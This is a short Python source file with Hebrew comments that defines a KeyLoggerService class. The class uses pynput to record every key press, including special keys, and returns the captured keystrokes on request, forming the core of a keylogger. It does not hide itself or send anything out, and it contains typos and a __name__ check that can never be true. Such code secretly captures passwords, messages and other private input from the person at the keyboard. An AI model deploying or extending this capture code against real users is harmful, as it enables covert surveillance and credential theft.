import time
from pynput import keyboard

class KeyLoggerService():
    def __init__(self):
        self.keystrokes = []
        self.lestener = keyboard.Listener(on_press = self.__on_press)
        self.runnuig = False

    def startLoggers(self):
        # הפעלת המאזין למקלדת
        self.lestener.start()

    def __on_press(self, key):
        try:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "[BACKSPACE]"
            elif hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                char = f"[{key.name}]"  # לוכד מקשים מיוחדים

            self.keystrokes.append(char)
            if __name__=="main":# שמירת ההקשה
                print(f"⏳ Key Pressed: {char}")  # הצגת ההקשה בזמן אמת

            if key == keyboard.Key.esc:  # הפסקת ההאזנה אם נלחץ Esc
                return False
        except AttributeError:
            pass
    def stop_loggers(self):
        self.lestener.stop()

    def get_loggers(self):
        data = self.keystrokes.copy()
        self.keystrokes.clear()
        return data



